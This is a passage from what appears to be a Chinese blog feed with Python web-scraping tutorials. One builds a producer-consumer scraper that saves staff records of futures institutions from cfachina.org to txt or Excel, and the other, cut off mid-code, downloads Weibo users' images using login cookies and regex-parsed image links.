<p>获取到某机构的任意从业信息页面后，使用<code>BeautifulSoup</code>可快速提取机构名称。</p>
<pre><code class="python">mechanism_name = soup.find(&#39;&#39;, {&#39;class&#39;:&#39;gst_title&#39;}).find_all(&#39;a&#39;)[2].get_text()
</code></pre>
<p>那么有人可能会问，既然主页表格都已经包含了所有机构的编号和名称，为何还要多此一举的再获取一次呢？这是因为，我压根就不想爬主页的那些表格，直接根据机构编号的递增规律生成对应的网址即可，所以获取机构名称的任务就放在了爬取每个机构首个信息页面之后。</p>
<h3 id="获取机构信息对应的网页数量"><a href="#获取机构信息对应的网页数量" class="headerlink" title="获取机构信息对应的网页数量"></a>获取机构信息对应的网页数量</h3><p><img src="/assets/spider/cfachina/page_cnt.png" alt="get count of page"></p>
<p>每个机构的数据量是不等的，幸好每个页面都包含了当前页面数及总页面数。使用以下代码即可获取页码数。</p>
<pre><code class="python">url_re = re.compile(&#39;#currentPage.*\+.*\+\&#39;(\d+)\&#39;&#39;)
page_cnt = url_re.search(html).group(1)
</code></pre>
<p>从每个机构首页获取页码数后，便可<code>for</code>循环修改网址参数中的<code>currentPage</code>，逐页获取机构信息。</p>
<h3 id="获取当前页面从业人员信息"><a href="#获取当前页面从业人员信息" class="headerlink" title="获取当前页面从业人员信息"></a>获取当前页面从业人员信息</h3><p><img src="/assets/spider/cfachina/personinfo_table.png" alt="get personinfo"></p>
<p>针对如上图所示的一个特定信息页时，人员信息被存放于一个表中，除了固定的表头信息外，人员信息均被包含在一个带有<code>id</code>的<code>tr</code>标签中，所以使用<code>BeautifulSoup</code>可以很容易提取出页面内所有人员信息。</p>
<pre><code class="python">soup.find_all(&#39;tr&#39;, id=True)
</code></pre>
<h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><p>一般的想法当然是逐页爬取主页信息，然后获取每页所有机构对应的网页链接，进而继续爬取每个机构信息。</p>
<p>但是由于该网站的机构信息网址具有明显的规律，我们根据每个机构的编号便可直接得到每个机构每个信息页面的网址。所以具体爬取方案如下：</p>
<ol>
<li>将所有<strong>机构编号</strong>网址存入队列<code>url_queue</code></li>
<li>新建生产者线程<code>SpiderThread</code>完成抓取任务<ul>
<li>循环从队列<code>url_queue</code>中读取一个编号，生成机构首页网址，使用<code>requests</code>抓取之</li>
<li>从抓取结果中获取页码数量，若为0，则返回该线程第1步</li>
<li>循环爬取当前机构剩余页面</li>
<li>将页面信息存入队列<code>html_queue</code></li>
</ul>
</li>
<li>新建消费者线程<code>DatamineThread</code>完成数据清洗任务<ul>
<li>循环从队列<code>html_queue</code>中读取一组页面信息</li>
<li>使用<code>BeautifulSoup</code>提取页面中的从业人员信息</li>
<li>将信息以二维数组形式存储，最后交由数据存储类<code>Storage</code>存入本地文件</li>
</ul>
</li>
</ol>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="生成者SpiderThread"><a href="#生成者SpiderThread" class="headerlink" title="生成者SpiderThread"></a>生成者<code>SpiderThread</code></h3><p>爬虫线程先从队列获取一个机构编号，生成机构首页网址并进行爬取，接着判断机构页面数量是否为0，如若不为0则继续获取机构名称，并根据页面数循环爬取剩余页面，将原始html数据以如下<code>dict</code>格式存入队列<code>html_queue</code>:</p>
<pre><code class="json">{
    &#39;name&#39;: mechanismId_mechanismName,
    &#39;num&#39;: currentPage,
    &#39;content&#39;: html
}
</code></pre>
<p>爬虫产生的数据队列<code>html_queue</code>将由数据清洗线程进行处理，下面是爬虫线程的主程序，整个线程代码请看后面的<a href="#源码">源码</a>。</p>
<pre><code class="python">def run(self):
    while True:
        mechanism_id = &#39;G0&#39; + self.url_queue.get()

        # the first page&#39;s url
        url = self.__get_url(mechanism_id, 1)
        html = self.grab(url)

        page_cnt = self.url_re.search(html.text).group(1)
        if page_cnt == &#39;0&#39;:
            self.url_queue.task_done()
            continue

        soup = BeautifulSoup(html.text, &#39;html.parser&#39;)
        mechanism_name = soup.find(&#39;&#39;, {&#39;class&#39;:&#39;gst_title&#39;}).find_all(&#39;a&#39;)[2].get_text()
        print(&#39;\nGrab Thread: get %s - %s with %s pages\n&#39; % (mechanism_id, mechanism_name, page_cnt))

        # put data into html_queue
        self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:1, &#39;content&#39;:html})
        for i in range(2, int(page_cnt) + 1):
            url = self.__get_url(mechanism_id, i)
            html = self.grab(url)
            self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:i, &#39;content&#39;:html})

        self.url_queue.task_done()
</code></pre>
<h3 id="消费者DatamineThread"><a href="#消费者DatamineThread" class="headerlink" title="消费者DatamineThread"></a>消费者<code>DatamineThread</code></h3><p>数据清洗线程比较简单，就是从生产者提供的数据队列<code>html_queue</code>逐一提取<code>html</code>数据，然后从<code>html</code>数据中提取从业人员信息，以二维数组形式存储，最后交由存储模块<code>Storage</code>完成数据存储工作。</p>
<pre><code class="python">class DatamineThread(Thread):
    &quot;&quot;&quot;Parse data from html&quot;&quot;&quot;
    def __init__(self, html_queue, filetype):
        Thread.__init__(self)
        self.html_queue = html_queue
        self.filetype = filetype

    def __datamine(self, data):
        &#39;&#39;&#39;Get data from html content&#39;&#39;&#39;
        soup = BeautifulSoup(data[&#39;content&#39;].text, &#39;html.parser&#39;)
        infos = []
        for info in soup.find_all(&#39;tr&#39;, id=True):
            items = []
            for item in info.find_all(&#39;td&#39;):
                items.append(item.get_text())
            infos.append(items)
        return infos

    def run(self):
        while True:
            data = self.html_queue.get()
            print(&#39;Datamine Thread: get %s_%d&#39; % (data[&#39;name&#39;], data[&#39;num&#39;]))

            store = Storage(data[&#39;name&#39;], self.filetype)
            store.save(self.__datamine(data))
            self.html_queue.task_done()
</code></pre>
<h3 id="数据存储Storage"><a href="#数据存储Storage" class="headerlink" title="数据存储Storage"></a>数据存储<code>Storage</code></h3><p>我写了两类文件格式的存储函数，<code>write_txt</code>, <code>write_excel</code>，分别对应<code>txt</code>,<code>excel</code>文件。实际存储时由调用方确定文件格式。</p>
<pre><code class="python">def save(self, data):
    {
        &#39;.txt&#39;: self.write_txt,
        &#39;.xls&#39;: self.write_excel
    }.get(self.filetype)(data)
</code></pre>
<h4 id="存入txt文件"><a href="#存入txt文件" class="headerlink" title="存入txt文件"></a>存入txt文件</h4><p>存入<code>txt</code>文件是比较简单的，就是以附加(<code>a</code>)形式打开文件，写入数据，关闭文件。其中，文件名称由调用方提供。写入数据时，每个人员信息占用一行，以制表符<code>\t</code>分隔。</p>
<pre><code class="python">def write_txt(self, data):
    &#39;&#39;&#39;Write data to txt file&#39;&#39;&#39;
    fid = open(self.path, &#39;a&#39;, encoding=&#39;utf-8&#39;)

    # insert the header of table
    if not os.path.getsize(self.path):
        fid.write(&#39;\t&#39;.join(self.table_header) + &#39;\n&#39;)

    for info in data:
        fid.write(&#39;\t&#39;.join(info) + &#39;\n&#39;)
    fid.close()
</code></pre>
<h4 id="存入Excel文件"><a href="#存入Excel文件" class="headerlink" title="存入Excel文件"></a>存入Excel文件</h4><p>存入<code>Excel</code>文件还是比较繁琐的，由于经验不多，选用的是<code>xlwt</code>, <code>xlrd</code>和<code>xlutils</code>库。说实话，这3个库真心不大好用，勉强完成任务而已。为什么这么说，且看：</p>
<ol>
<li>修改文件麻烦：<code>xlwt</code>只能写,<code>xlrd</code>只能读，需要<code>xlutils</code>的<code>copy</code>函数将<code>xlrd</code>读取的数据复制到内存，再用<code>xlwt</code>修改</li>
<li>只支持<code>.xls</code>文件：<code>.xlsx</code>经读写也会变成<code>.xls</code>格式</li>
<li>表格样式易变：只要重新写入文件，表格样式必然重置</li>
</ol>
<p>所以后续我肯定会再学学其它的<code>excel</code>库，当然，当前解决方案暂时还用这三个。代码如下：</p>
<pre><code class="python">def write_excel(self, data):
    &#39;&#39;&#39;write data to excel file&#39;&#39;&#39;
    if not os.path.exists(self.path):
        header_style = xlwt.easyxf(&#39;font:name 楷体, color-index black, bold on&#39;)
        wb = xlwt.Workbook(encoding=&#39;utf-8&#39;)
        ws = wb.add_sheet(&#39;Data&#39;)

        # insert the header of table
        for i in range(len(self.table_header)):
            ws.write(0, i, self.table_header[i], header_style)
    else:
        rb = open_workbook(self.path)
        wb = copy(rb)
        ws = wb.get_sheet(0)

    # write data
    offset = len(ws.rows)
    for i in range(0, len(data)):
        for j in range(0, len(data[0])):
            ws.write(offset + i, j, data[i][j])

    # When use xlutils.copy.copy function to copy data from exist .xls file,
    # it will loss the origin style, so we need overwrite the width of column,
    # maybe there some other good solution, but I have not found yet.
    for i in range(len(self.table_header)):
        ws.col(i).width = 256 * (10, 10, 15, 20, 50, 20, 15)[i]

    # save to file
    while True:
        try:
            wb.save(self.path)
            break
        except PermissionError as e:
            print(&#39;{0} error: {1}&#39;.format(self.path, e.strerror))
            time.sleep(5)
        finally:
            pass
</code></pre>
<p>说明：</p>
<ol>
<li>一个文件对应一个机构的数据，需要多次读取和写入，所以需要计算文件写入时的行数偏移量<code>offset</code>，即当前文件已包含数据的行数；</li>
<li>当被写入文件被人为打开时，会出现<code>PermissionError</code>异常，可以在捕获该异常然后提示错误信息，并定时等待直到文件被关闭。</li>
</ol>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>主函数用于创建和启动生产者线程和消费者线程，同时为生产者线程提供机构编号队列。</p>
<pre><code class="python">url_queue = queue.Queue()
html_queue = queue.Queue()

def main():
    for i in range(1001, 1199):
        url_queue.put(str(i))

    # create and start a spider thread
    st = SpiderThread(url_queue, html_queue)
    st.setDaemon(True)
    st.start()

    # create and start a datamine thread
    dt = DatamineThread(html_queue, &#39;.xls&#39;)
    dt.setDaemon(True)
    dt.start()

    # wait on the queue until everything has been processed
    url_queue.join()
    html_queue.join()
</code></pre>
<p>从主函数可以看到，两个队列都调用了<code>join</code>函数，用于阻塞，直到对应队列为空为止。要注意的是，队列操作中，<strong>每个出队操作<code>queue.get()</code>需要对应一个<code>queue.task_done()</code>操作</strong>，否则会出现队列数据已全部处理完，但主线程仍在执行的情况。</p>
<p>至此，爬虫的主要代码便讲解完了，下面是完整源码。</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code class="python">#!/usr/bin/python3
# -*-coding:utf-8-*-

import queue
from threading import Thread

import requests

import re
from bs4 import BeautifulSoup

import os
import platform

import xlwt
from xlrd import open_workbook
from xlutils.copy import copy

import time

# url format ↓
# http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo&amp;all=undefined
# organid: +G01001+, +G01002+, +G01003+, ...
# currentPage: 1, 2, 3, ...
# pageSize: 20(default)
#
# Algorithm design:
# 2 threads with 2 queues
# Thread-1, get first page url, then get page_num and mechanism_name from first page
# Thread-2, parse html file and get data from it, then output data to local file
# url_queue data -&gt; &#39;url&#39;  # first url of each mechanism
# html_queue data -&gt; {&#39;name&#39;:&#39;mechanism_name&#39;, &#39;html&#39;:data}

url_queue = queue.Queue()
html_queue = queue.Queue()


class SpiderThread(Thread):
    &quot;&quot;&quot;Threaded Url Grab&quot;&quot;&quot;
    def __init__(self, url_queue, html_queue):
        Thread.__init__(self)
        self.url_queue = url_queue
        self.html_queue = html_queue
        self.page_size = 20
        self.url_re = re.compile(&#39;#currentPage.*\+.*\+\&#39;(\d+)\&#39;&#39;)
        self.headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&#39;}

    def __get_url(self, mechanism_id, current_page):
        return &#39;http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+%s+&amp;currentPage=%d&amp;pageSize=%d&amp;selectType=personinfo&amp;all=undefined&#39; \
        % (mechanism_id, current_page, self.page_size)

    def grab(self, url):
        &#39;&#39;&#39;Grab html of url from web&#39;&#39;&#39;
        while True:
            try:
                html = requests.get(url, headers=self.headers, timeout=20)
                if html.status_code == 200:
                    break
            except requests.exceptions.ConnectionError as e:
                print(url + &#39; Connection error, try again...&#39;)
            except requests.exceptions.ReadTimeout as e:
                print(url + &#39; Read timeout, try again...&#39;)
            except Exception as e:
                print(str(e))
            finally:
                pass
        return html

    def run(self):
        &#39;&#39;&#39;Grab all htmls of mechanism one by one
        Steps:
            1. grab first page of each mechanism from url_queue
            2. get number of pages and mechanism name from first page
            3. grab all html file of each mechanism
            4. push all html to html_queue
        &#39;&#39;&#39;
        while True:
            mechanism_id = &#39;G0&#39; + self.url_queue.get()

            # the first page&#39;s url
            url = self.__get_url(mechanism_id, 1)
            html = self.grab(url)

            page_cnt = self.url_re.search(html.text).group(1)
            if page_cnt == &#39;0&#39;:
                self.url_queue.task_done()
                continue

            soup = BeautifulSoup(html.text, &#39;html.parser&#39;)
            mechanism_name = soup.find(&#39;&#39;, {&#39;class&#39;:&#39;gst_title&#39;}).find_all(&#39;a&#39;)[2].get_text()
            print(&#39;\nGrab Thread: get %s - %s with %s pages\n&#39; % (mechanism_id, mechanism_name, page_cnt))

            # put data into html_queue
            self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:1, &#39;content&#39;:html})
            for i in range(2, int(page_cnt) + 1):
                url = self.__get_url(mechanism_id, i)
                html = self.grab(url)
                self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:i, &#39;content&#39;:html})

            self.url_queue.task_done()


class DatamineThread(Thread):
    &quot;&quot;&quot;Parse data from html&quot;&quot;&quot;
    def __init__(self, html_queue, filetype):
        Thread.__init__(self)
        self.html_queue = html_queue
        self.filetype = filetype

    def __datamine(self, data):
        &#39;&#39;&#39;Get data from html content&#39;&#39;&#39;
        soup = BeautifulSoup(data[&#39;content&#39;].text, &#39;html.parser&#39;)
        infos = []
        for info in soup.find_all(&#39;tr&#39;, id=True):
            items = []
            for item in info.find_all(&#39;td&#39;):
                items.append(item.get_text())
            infos.append(items)
        return infos

    def run(self):
        while True:
            data = self.html_queue.get()
            print(&#39;Datamine Thread: get %s_%d&#39; % (data[&#39;name&#39;], data[&#39;num&#39;]))

            store = Storage(data[&#39;name&#39;], self.filetype)
            store.save(self.__datamine(data))
            self.html_queue.task_done()


class Storage():
    def __init__(self, filename, filetype):
        self.filetype = filetype
        self.filename = filename + filetype
        self.table_header = (&#39;姓名&#39;, &#39;性别&#39;, &#39;从业资格号&#39;, &#39;投资咨询从业证书号&#39;, &#39;任职部门&#39;, &#39;职务&#39;, &#39;任现职时间&#39;)
        self.path = self.__get_path()

    def __get_path(self):
        path = {
            &#39;Windows&#39;: &#39;D:/litreily/Documents/python/cfachina&#39;,
            &#39;Linux&#39;: &#39;/mnt/d/litreily/Documents/python/cfachina&#39;
        }.get(platform.system())

        if not os.path.isdir(path):
            os.makedirs(path)
        return &#39;%s/%s&#39; % (path, self.filename)

    def write_txt(self, data):
        &#39;&#39;&#39;Write data to txt file&#39;&#39;&#39;
        fid = open(self.path, &#39;a&#39;, encoding=&#39;utf-8&#39;)

        # insert the header of table
        if not os.path.getsize(self.path):
            fid.write(&#39;\t&#39;.join(self.table_header) + &#39;\n&#39;)

        for info in data:
            fid.write(&#39;\t&#39;.join(info) + &#39;\n&#39;)
        fid.close()

    def write_excel(self, data):
        &#39;&#39;&#39;write data to excel file&#39;&#39;&#39;
        if not os.path.exists(self.path):
            header_style = xlwt.easyxf(&#39;font:name 楷体, color-index black, bold on&#39;)
            wb = xlwt.Workbook(encoding=&#39;utf-8&#39;)
            ws = wb.add_sheet(&#39;Data&#39;)

            # insert the header of table
            for i in range(len(self.table_header)):
                ws.write(0, i, self.table_header[i], header_style)
        else:
            rb = open_workbook(self.path)
            wb = copy(rb)
            ws = wb.get_sheet(0)

        # write data
        offset = len(ws.rows)
        for i in range(0, len(data)):
            for j in range(0, len(data[0])):
                ws.write(offset + i, j, data[i][j])

        # When use xlutils.copy.copy function to copy data from exist .xls file,
        # it will loss the origin style, so we need overwrite the width of column,
        # maybe there some other good solution, but I have not found yet.
        for i in range(len(self.table_header)):
            ws.col(i).width = 256 * (10, 10, 15, 20, 50, 20, 15)[i]

        # save to file
        while True:
            try:
                wb.save(self.path)
                break
            except PermissionError as e:
                print(&#39;{0} error: {1}&#39;.format(self.path, e.strerror))
                time.sleep(5)
            finally:
                pass

    def save(self, data):
        &#39;&#39;&#39;Write data to local file.

        According filetype to choose function to save data, filetype can be &#39;.txt&#39;
        or &#39;.xls&#39;, but &#39;.txt&#39; type is saved more faster then &#39;.xls&#39; type

        Args:
            data: a 2d-list array that need be save
        &#39;&#39;&#39;
        {
            &#39;.txt&#39;: self.write_txt,
            &#39;.xls&#39;: self.write_excel
        }.get(self.filetype)(data)


def main():
    for i in range(1001, 1199):
        url_queue.put(str(i))

    # create and start a spider thread
    st = SpiderThread(url_queue, html_queue)
    st.setDaemon(True)
    st.start()

    # create and start a datamine thread
    dt = DatamineThread(html_queue, &#39;.xls&#39;)
    dt.setDaemon(True)
    dt.start()

    # wait on the queue until everything has been processed
    url_queue.join()
    html_queue.join()


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p><img src="/assets/spider/cfachina/spider.png" alt="spider"></p>
<p><img src="/assets/spider/cfachina/save_txt.png" alt="save to txt"></p>
<p><img src="/assets/spider/cfachina/save_xls.png" alt="save to excel"></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><ul>
<li>测试发现，写入<code>txt</code>的速度明显高于写入<code>excel</code>的速度</li>
<li>如果将页面网址中的<code>pageSize</code>修改为<code>1000</code>或更大，则可以一次性获取某机构的所有从业人员信息，而不用逐页爬取，效率可以大大提高。</li>
<li>该爬虫已托管至<a href="https://github.com/Litreily/Python-demos" target="_blank" rel="noopener">github Python-demos</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> queue </tag>
            
            <tag> xlwt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫2 - 爬取新浪微博用户图片]]></title>
      <url>https://www.litreily.top/2018/04/10/sina/</url>
      <content type="html"><![CDATA[<p>其实，新浪微博用户图片爬虫是我学习<code>python</code>以来写的第一个爬虫，只不过当时懒，后来爬完<code>Lofter</code>后觉得有必要总结一下，所以就有了第一篇爬虫博客。现在暂时闲下来了，准备把新浪的这个也补上。</p>
<p>言归正传，既然选择爬新浪微博，那当然是有需求的，这也是学习的主要动力之一，没错，就是美图。<code>sina</code>用户多数微博都是包含图片的，而且是组图居多，单个图片的较少。</p>
<p>为了避免侵权，本文以本人微博<a href="https://weibo.com/litreily" target="_blank" rel="noopener">litreily</a>为例说明整个爬取过程，虽然图片较少，质量较低，但爬取方案是绝对ok的，使用时只要换个用户ID就可以了。</p>
<h2 id="分析sina站点"><a href="#分析sina站点" class="headerlink" title="分析sina站点"></a>分析sina站点</h2><h3 id="获取用户ID"><a href="#获取用户ID" class="headerlink" title="获取用户ID"></a>获取用户ID</h3><p>在爬取前，我们需要知道的是每个用户都有一个用户名，而一个用户名又对应一个唯一的整型数字ID，类似于学生的学号，本人的是<code>2657006573</code>。至于怎么根据用户名去获取ID，有以下两种方法：</p>
<ol>
<li>进入待爬取用户主页，在浏览器网址栏中即可看到一串数据，那就是用户ID</li>
<li><code>Ctrl-U</code>查看待爬取用户的源码，搜索<code>&quot;uid</code>，注意是<strong>双引号</strong></li>
</ol>
<p>其实是可以在已知用户名的情况下通过爬虫自动获取到<code>uid</code>的，但是我当时初学<code>python</code>，并没有考虑充分，所以后面的源码是以用户ID作为输入参数的。</p>
<h3 id="图片存储参数解析"><a href="#图片存储参数解析" class="headerlink" title="图片存储参数解析"></a>图片存储参数解析</h3><p>用户所有的图片都被存放至这样的路径下，真的是<strong>所有图片</strong>哦！！！</p>
<pre><code class="yml">https://weibo.cn/{uid}/profile?filter={filter_type}&amp;page={page_num}

# example
https://weibo.cn/2657006573/profile?filter=0&amp;page=1
uid: 2657006573
filter_type: 0
page_num: 1
</code></pre>
<p>注意，是<code>weibo.cn</code>而不是<code>weibo.com</code>，至于我是怎么找到这个页面的，说实话，我也忘了。。。</p>
<p>链接中包含3个参数，<code>uid</code>, <code>filter_mode</code> 以及 <code>page_num</code>。其中，<code>uid</code>就是前面提及的用户ID，<code>page_num</code>也很好理解，就是分页的当前页数，从1开始增加，那么，这个<code>filter_mode</code>是什么呢？</p>
<p>不着急，我们先来看看页面↓</p>
<p><img src="/assets/spider/sina/filter_mode.png" alt="filter mode of pictures"></p>
<p>可以看到，滤波类型<code>filter_mode</code>指的就是筛选条件，一共三个：</p>
<ol>
<li>filter=0 全部微博（包含纯文本微博，转载微博）</li>
<li>filter=1 原创微博（包含纯文本微博）</li>
<li>filter=2 图片微博（必须含有图片，包含转载）</li>
</ol>
<p>我通常会选择<strong>原创</strong>，因为我并不希望爬取结果中包含转载微博中的图片。当然，大家依照自己的需要选择即可。</p>
<h3 id="图链解析"><a href="#图链解析" class="headerlink" title="图链解析"></a>图链解析</h3><p>好了，参数来源都知道了，我们回过头看看这个网页。页面是不是感觉就是个空架子？毫无css痕迹，没关系，新浪本来就没打算把这个页面主动呈现给用户。但对于爬虫而言，这却是极好的，为什么这么说？原因如下：</p>
<ol>
<li>图片齐全，没有遗漏，就是个可视化的数据库</li>
<li>样式少，页面简单，省流量，爬取快</li>
<li>静态网页，分页存储，所见即所得</li>
<li>源码包含了所有微博的<strong>首图</strong>和<strong>组图链接</strong></li>
</ol>
<p>这样的网页用来练手再合适不过。但要注意的是上面第4点，什么是<strong>首图</strong>和<strong>组图链接</strong>呢，很好理解。每篇博客可能包含多张图片，那就是<strong>组图</strong>，但该页面只显示博客的第一张图片，即所谓的<strong>首图</strong>，<strong>组图链接</strong>指向的是存储着该组图所有图片的网址。</p>
<p>由于本人微博没组图，所以此处以刘亦菲微博为例，说明单图及组图的图链格式</p>
<p><img src="/assets/spider/sina/pictures.png" alt="pictures"></p>
<p>图中的上面一篇微博只有一张图片，可以轻易获取到原图链接，注意是<strong>原图</strong>，因为我们在页面能看到的是缩略图，但要爬取的当然是<strong>原图</strong>啦。</p>
<p>图中下面的微博包含组图，在图片右侧的<code>Chrome</code>开发工具可以看到组图链接。</p>
<p><a href="https://weibo.cn/mblog/picAll/FCQefgeAr?rl=2" target="_blank" rel="noopener">https://weibo.cn/mblog/picAll/FCQefgeAr?rl=2</a></p>
<p>打开组图链接，可以看到图片如下图所示：</p>
<p><img src="/assets/spider/sina/picture_url.png" alt="picture&#39;s url"></p>
<p>可以看到缩略图链接以及原图链接，然后我们点击<strong>原图</strong>看一下。</p>
<p><img src="/assets/spider/sina/picture_source.png" alt="picture&#39;s origin url"></p>
<p>可以发现，弹出页面的链接与上图显示的不同，但与上图中的缩略图链接极为相似。它们分别是：</p>
<ol>
<li>缩略图：<a href="http://ww1.sinaimg.cn/thumb180/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg" target="_blank" rel="noopener">http://ww1.sinaimg.cn/thumb180/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg</a></li>
<li>原图：<a href="http://wx1.sinaimg.cn/large/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg" target="_blank" rel="noopener">http://wx1.sinaimg.cn/large/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg</a></li>
</ol>
<p>可以看出，只是一个<code>thumb180</code>和<code>large</code>的区别。既然发现了规律，那就好办多了，我们只要知道缩略图的网址，就可以将域名后的第一级子域名替换成<code>large</code>就可以了，而不用获取<strong>原图</strong>链接再跳转一次。</p>
<p>而且，多次尝试可以发现组图链接及缩略图链接满足正则表达式：</p>
<pre><code class="python"># 1. 组图链接：
imglist_reg = r&#39;href=&quot;(https://weibo.cn/mblog/picAll/.{9}\?rl=2)&quot;&#39;

# 2. 缩略图
img_reg = r&#39;src=&quot;(http://w.{2}\.sinaimg.cn/(.{6,8})/.{32,33}.(jpg|gif))&quot;&#39;
</code></pre>
<p>到此，新浪微博的解析过程就结束了，图链的格式以及获取方式也都清楚了。下面就可以设计方案进行爬取了。</p>
<h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><p>根据解析结果，很容易制定出以下爬取方案：</p>
<ol>
<li>给定微博用户名<code>litreily</code></li>
<li>进入待爬取用户主页，即可从网址中获取<code>uid: 2657006573</code></li>
<li>获取本人登录微博后的<code>cookies</code>（请求报文需要用到<code>cookies</code>）</li>
<li>逐一爬取<a href="https://weibo.cn/2657006573/profile?filter=0&amp;page={1,2,3,...}" target="_blank" rel="noopener">https://weibo.cn/2657006573/profile?filter=0&amp;page={1,2,3,...}</a></li>
<li>解析每一页的源码，获取单图链接及组图链接，<ul>
<li>单图：直接获取该图缩略图链接；</li>
<li>组图：爬取组图链接，循环获取组图页面所有图片的缩略图链接</li>
</ul>
</li>
<li>循环将第5步获取到的图链替换为原图链接，并下载至本地</li>
<li>重复第4-6步，直至没有图片</li>
</ol>
<h3 id="获取cookies"><a href="#获取cookies" class="headerlink" title="获取cookies"></a>获取cookies</h3><p>针对以上方案，其中有几个重点内容，其一就是<code>cookies</code>的获取，我暂时还没学怎么自动获取<code>cookies</code>，所以目前是登录微博后手动获取的。</p>
<p><img src="/assets/spider/sina/cookies.png" alt="get cookies"></p>
<h3 id="下载网页"><a href="#下载网页" class="headerlink" title="下载网页"></a>下载网页</h3><p>下载网页用的是<code>python3</code>自带的<code>urllib</code>库，当时没学<code>requests</code>，以后可能也很少用<code>urllib</code>了。</p>
<pre><code class="python">def _get_html(url, headers):
    try:
        req = urllib.request.Request(url, headers = headers)
        page = urllib.request.urlopen(req)
        html = page.read().decode(&#39;UTF-8&#39;)
    except Exception as e:
        print(&quot;get %s failed&quot; % url)
        return None
    return html
</code></pre>
<h3 id="获取存储路径"><a href="#获取存储路径" class="headerlink" title="获取存储路径"></a>获取存储路径</h3><p>由于我是在<code>win10</code>下编写的代码，但是个人比较喜欢用<code>bash</code>，所以图片的存储路径有以下两种格式，<code>_get_path</code>函数会自动判断当前操作系统的类型，然后选择相应的路径。</p>
<pre><code class="python">def _get_path(uid):
    path = {
        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/sina/&#39; + uid,
        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/sina/&#39; + uid
    }.get(platform.system())

    if not os.path.isdir(path):
        os.makedirs(path)
    return path
</code></pre>
<p>幸好<code>windows</code>是兼容<code>linux</code>系统的斜杠符号的，不然程序中的相对路径替换还挺麻烦。</p>
<h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><p>由于选用的<code>urllib</code>库，所以下载图片就使用<code>urllib.request.urlretrieve</code>了</p>
<pre><code class="python"># image url of one page is saved in imgurls
for img in imgurls:
    imgurl = img[0].replace(img[1], &#39;large&#39;)
    num_imgs += 1
    try:
        urllib.request.urlretrieve(imgurl, &#39;{}/{}.{}&#39;.format(path, num_imgs, img[2]))
        # display the raw url of images
        print(&#39;\t%d\t%s&#39; % (num_imgs, imgurl))
    except Exception as e:
        print(str(e))
        print(&#39;\t%d\t%s failed&#39; % (num_imgs, imgurl))
</code></pre>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>其它细节详见源码</p>
<pre><code class="python">#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author: litreily
# date: 2018.02.05
&quot;&quot;&quot;Capture pictures from sina-weibo with user_id.&quot;&quot;&quot;

import re
import os
import platform

import urllib
import urllib.request

from bs4 import BeautifulSoup


def _get_path(uid):
    path = {
        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/sina/&#39; + uid,
        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/sina/&#39; + uid
    }.get(platform.system())

    if not os.path.isdir(path):
        os.makedirs(path)
    return path


def _get_html(url, headers):
    try:
        req = urllib.request.Request(url, headers = headers)
        page = urllib.request.urlopen(req)
        html = page.read().decode(&#39;UTF-8&#39;)
    except Exception as e:
        print(&quot;get %s failed&quot; % url)
        return None
    return html


def _capture_images(uid, headers, path):
    filter_mode = 1      # 0-all 1-original 2-pictures
    num_pages = 1
    num_blogs = 0
    num_imgs = 0

    # regular expression of imgList and img
    imglist_reg = r&#39;href=&quot;(https://weibo.cn/mblog/picAll/.{9}\?rl=2)&quot;&#39;
    imglist_pattern = re.compile(imglist_reg)
    img_reg = r&#39;src=&quot;(http://w.{2}\.sinaimg.cn/(.{6,8})/.{32,33}.(jpg|gif))&quot;&#39;
    img_pattern = re.compile(img_reg)

    print(&#39;start capture picture of uid:&#39; + uid)
    while True:
        url = &#39;https://weibo.cn/%s/profile?filter=%s&amp;page=%d&#39; % (uid, filter_mode, num_pages)

        # 1. get html of each page url
        html = _get_html(url, headers)

        # 2. parse the html and find all the imgList Url of each page
        soup = BeautifulSoup(html, &quot;lxml&quot;)
        # &lt;div class=&quot;c&quot; id=&quot;M_G4gb5pY8t&quot;&gt;&lt;div&gt;
        blogs = soup.body.find_all(attrs={&#39;id&#39;:re.compile(r&#39;^M_&#39;)}, recursive=False)
        num_blogs += len(blogs)

        imgurls = []
        for blog in blogs:
            blog = str(blog)
            imglist_url = imglist_pattern.findall(blog)
            if not imglist_url:
                # 2.1 get img-url from blog that have only one pic
                imgurls += img_pattern.findall(blog)
            else:
                # 2.2 get img-urls from blog that have group pics
